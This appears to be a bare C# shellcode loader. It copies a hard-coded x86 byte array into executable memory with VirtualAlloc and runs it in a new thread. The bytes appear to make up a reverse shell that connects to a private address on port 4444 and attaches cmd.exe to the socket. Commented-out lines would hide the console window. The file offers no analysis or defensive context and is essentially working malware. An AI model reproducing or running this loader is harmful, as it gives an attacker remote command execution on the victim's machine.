using System;
using System.Runtime.InteropServices;

class Program
{

    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


    static void Main()
    {
        IntPtr threatHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;

        byte[] code = new byte[] { 0x31,0xc9,0xf7,0xe1,0x64,0x8b,0x41,0x30,0x8b,0x40,0x0c,0x8b,0x70,
0x14,0xad,0x96,0xad,0x8b,0x58,0x10,0x31,0xc9,0xf7,0xe1,0x64,0x8b,0x41,0x30,0x8b,0x40,0x0c,0x8b,0x70,
0x14,0xad,0x96,0xad,0x8b,0x58,0x10,0x8b,0x53,0x3c,0x01,0xda,0x8b,
0x52,0x78,0x01,0xda,0x8b,0x72,0x20,0x01,0xde,0x31,0xc9,0x41,0xad,
0x01,0xd8,0x81,0x38,0x47,0x65,0x74,0x50,0x75,0xf4,0x81,0x78,0x04,
0x72,0x6f,0x63,0x41,0x75,0xeb,0x81,0x78,0x08,0x64,0x64,0x72,0x65,
0x75,0xe2,0x8b,0x72,0x24,0x01,0xde,0x66,0x8b,0x0c,0x4e,0x49,0x8b,
0x72,0x1c,0x01,0xde,0x8b,0x14,0x8e,0x01,0xda,0x89,0xd5,0x31,0xc9,
0x51,0x68,0x61,0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,0x4c,
0x6f,0x61,0x64,0x54,0x53,0xff,0xd2,0x68,0x33,0x32,0x61,0x61,0x66,
0x81,0x6c,0x24,0x02,0x61,0x61,0x68,0x77,0x73,0x32,0x5f,0x54,0xff,
0xd0,0x89,0xc6,0x68,0x75,0x70,0x61,0x61,0x66,0x81,0x6c,0x24,0x02,
0x61,0x61,0x68,0x74,0x61,0x72,0x74,0x68,0x57,0x53,0x41,0x53,0x54,
0x56,0xff,0xd5,0x31,0xd2,0x66,0xba,0x90,0x01,0x29,0xd4,0x54,0x52,
0xff,0xd0,0x68,0x74,0x41,0x61,0x61,0x66,0x81,0x6c,0x24,0x02,0x61,
0x61,0x68,0x6f,0x63,0x6b,0x65,0x68,0x57,0x53,0x41,0x53,0x54,0x56,
0xff,0xd5,0x31,0xd2,0x52,0x52,0x52,0xb2,0x06,0x52,0x80,0xea,0x05,
0x52,0x42,0x52,0xff,0xd0,0x50,0x5f,0x68,0x65,0x63,0x74,0x61,0x66,
0x83,0x6c,0x24,0x03,0x61,0x68,0x63,0x6f,0x6e,0x6e,0x54,0x56,0xff,
0xd5,0xba,0x0b,0x09,0x01,0x04,0x81,0xea,0x01,0x01,0x01,0x01,0x52,
0x66,0x68,0x11,0x5c,0x31,0xd2,0xb2,0x02,0x66,0x52,0x89,0xe2,0x6a,
0x10,0x52,0x57,0xff,0xd0,0x31,0xc9,0x68,0x73,0x41,0x61,0x61,0x66,
0x81,0x6c,0x24,0x02,0x61,0x61,0x68,0x6f,0x63,0x65,0x73,0x68,0x74,
0x65,0x50,0x72,0x68,0x43,0x72,0x65,0x61,0x54,0x53,0xff,0xd5,0x89,
0xde,0x68,0x63,0x6d,0x64,0x61,0x66,0x83,0x6c,0x24,0x03,0x61,0x89,
0xe3,0x57,0x57,0x57,0x31,0xff,0x6a,0x12,0x59,0x57,0xe2,0xfd,0x66,
0xc7,0x44,0x24,0x3c,0x01,0x01,0xc6,0x44,0x24,0x10,0x44,0x8d,0x4c,
0x24,0x10,0x54,0x51,0x57,0x57,0x57,0x47,0x57,0x4f,0x57,0x57,0x53,
0x57,0xff,0xd0,0x83,0xc4,0x10,0x68,0x65,0x73,0x73,0x61,0x66,0x83,
0x6c,0x24,0x03,0x61,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,
0x74,0x54,0x56,0xff,0xd5,0x31,0xc9,0x51,0xff,0xd0,0xff,0xff,0xff,
0xff,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00 };


        // Hide the window
        // var handle = GetConsoleWindow();
        // ShowWindow(handle, 0);


        UInt32 codeAddr = VirtualAlloc(0, (UInt32)code.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(code, 0, (IntPtr)(codeAddr), code.Length);
        threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threatHandle, 0xFFFFFFFF);

        return;
    }
}